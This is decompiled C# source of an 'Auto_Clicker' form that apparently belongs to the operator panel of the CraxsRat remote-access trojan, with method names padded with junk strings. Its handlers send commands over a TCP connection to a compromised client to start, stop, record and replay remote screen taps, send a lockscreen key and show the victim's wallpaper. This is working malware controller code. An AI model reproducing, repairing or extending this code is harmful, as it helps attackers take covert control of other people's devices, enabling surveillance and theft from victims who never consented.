using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000034 RID: 52
[DesignerGenerated]
public partial class Auto_Clicker : Form
{
	// Token: 0x060001DE RID: 478 RVA: 0x000023F2 File Offset: 0x000005F2
	public Auto_Clicker()
	{
		base.Load += this.Auto_Clicker_Load;
		base.FormClosing += this.Auto_Clicker_FormClosing;
		this.InitializeComponent();
	}

	// Token: 0x060001DF RID: 479 RVA: 0x000147A4 File Offset: 0x000129A4
	public void DrawPoint(object[] obj)
	{
		if (this.Panel3.InvokeRequired)
		{
			Auto_Clicker.Drawdele method = new Auto_Clicker.Drawdele(this.DrawPoint);
			this.Panel3.Invoke(method, new object[]
			{
				obj
			});
		}
		else
		{
			int num = Conversions.ToInteger(obj[0]);
			int num2 = Conversions.ToInteger(obj[1]);
			int num3 = Conversions.ToInteger(obj[2]);
			int num4 = Conversions.ToInteger(obj[3]);
			Graphics graphics = this.Panel3.CreateGraphics();
			Pen pen = new Pen(Color.Red, 10f);
			Point point = checked(new Point((int)Math.Round(unchecked((double)num * ((double)this.Panel3.Width / (double)num3))), (int)Math.Round(unchecked((double)num2 * ((double)this.Panel3.Height / (double)num4)))));
			graphics.DrawEllipse(pen, point.X, point.Y, 6, 6);
		}
	}

	// Token: 0x060001E0 RID: 480 RVA: 0x00014884 File Offset: 0x00012A84
	public void UpdateStatus(object[] obj)
	{
		if (this.statustext.InvokeRequired)
		{
			Auto_Clicker.updatedele method = new Auto_Clicker.updatedele(this.UpdateStatus);
			this.statustext.Invoke(method, new object[]
			{
				obj
			});
		}
		else
		{
			string text = Conversions.ToString(obj[0]);
			this.statustext.Text = text;
		}
	}

	// Token: 0x060001E1 RID: 481 RVA: 0x000148DC File Offset: 0x00012ADC
	public void AddRecords(object[] obj)
	{
		if (this.selectedrecord.InvokeRequired)
		{
			Auto_Clicker.recordnames method = new Auto_Clicker.recordnames(this.AddRecords);
			this.selectedrecord.Invoke(method, new object[]
			{
				obj
			});
		}
		else
		{
			string[] array = (string[])obj[0];
			string[] array2 = array;
			foreach (string text in array2)
			{
				try
				{
					if (!this.selectedrecord.Items.Contains(text))
					{
						this.selectedrecord.Items.Add(text);
						this.selectedrecord.Text = text;
						this.selectedrecord.Refresh();
					}
				}
				catch (Exception)
				{
				}
			}
		}
	}

	// Token: 0x060001E2 RID: 482 RVA: 0x0000206C File Offset: 0x0000026C
	private void Panel3_MouseClick(object sender, MouseEventArgs e)
	{
	}

	// Token: 0x060001E3 RID: 483 RVA: 0x0000206C File Offset: 0x0000026C
	private void Button1_Click_1(object sender, EventArgs e)
	{
	}

	// Token: 0x060001E4 RID: 484 RVA: 0x0001499C File Offset: 0x00012B9C
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwnmydf(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"Aclk<*>[L]",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060001E5 RID: 485 RVA: 0x00014AB4 File Offset: 0x00012CB4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsgdfer(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"Aclk<*>Start",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060001E6 RID: 486 RVA: 0x00014BCC File Offset: 0x00012DCC
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdxzc(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"Aclk<*>Stop",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060001E7 RID: 487 RVA: 0x00014CE4 File Offset: 0x00012EE4
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatstybgtdq(object sender, EventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			Dialog1 dialog = new Dialog1();
			dialog.Title = "Enter Record Name";
			dialog.ShowDialog();
			if (dialog.DialogResult == DialogResult.OK)
			{
				string[] array = this.Classclient.Keys.Split(new char[]
				{
					':'
				});
				object[] parametersObjects = new object[]
				{
					myClient,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient2,
						Data.SPL_SOCKET,
						"Aclk<*>{Record,",
						dialog.TheText,
						"}",
						Data.SPL_SOCKET,
						array[0],
						Data.SPL_SOCKET,
						array[1],
						Data.SPL_SOCKET,
						SecurityKey.Lockscreen,
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Conversions.ToString(0),
						Data.SPL_SOCKET,
						Data.SPL_ARRAY,
						Data.SPL_SOCKET,
						this.Classclient.ClientRemoteAddress
					}),
					Codes.Encoding().GetBytes("null"),
					this.Classclient
				};
				this.Classclient.SendMessage(parametersObjects);
			}
		}
	}

	// Token: 0x060001E8 RID: 488 RVA: 0x00002424 File Offset: 0x00000624
	private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
	{
		this.Panel3.Invalidate();
	}

	// Token: 0x060001E9 RID: 489 RVA: 0x00014E3C File Offset: 0x0001303C
	private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsasdaswcdnb(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.selectedrecord.Text) | string.IsNullOrWhiteSpace(this.selectedrecord.Text))
		{
			EagleAlert.Showinformation("Select Record First");
		}
		else if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"Aclk<*>{Repet,",
					this.selectedrecord.Text,
					"}",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060001EA RID: 490 RVA: 0x00002431 File Offset: 0x00000631
	private void Auto_Clicker_Load(object sender, EventArgs e)
	{
		this.clientimage.Image = this.Classclient.Wallpaper;
	}

	// Token: 0x060001EB RID: 491 RVA: 0x00014BCC File Offset: 0x00012DCC
	private void Auto_Clicker_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (this.Classclient != null)
		{
			TcpClient myClient = this.Classclient.myClient;
			string[] array = this.Classclient.Keys.Split(new char[]
			{
				':'
			});
			object[] parametersObjects = new object[]
			{
				myClient,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient2,
					Data.SPL_SOCKET,
					"Aclk<*>Stop",
					Data.SPL_SOCKET,
					array[0],
					Data.SPL_SOCKET,
					array[1],
					Data.SPL_SOCKET,
					SecurityKey.Lockscreen,
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Conversions.ToString(0),
					Data.SPL_SOCKET,
					Data.SPL_ARRAY,
					Data.SPL_SOCKET,
					this.Classclient.ClientRemoteAddress
				}),
				Codes.Encoding().GetBytes("null"),
				this.Classclient
			};
			this.Classclient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x0400014C RID: 332
	public Client Classclient;

	// Token: 0x02000035 RID: 53
	// (Invoke) Token: 0x060001ED RID: 493
	public delegate void Drawdele(object[] obj);

	// Token: 0x02000036 RID: 54
	// (Invoke) Token: 0x060001F1 RID: 497
	public delegate void updatedele(object[] obj);

	// Token: 0x02000037 RID: 55
	// (Invoke) Token: 0x060001F5 RID: 501
	public delegate void recordnames(object[] obj);
}
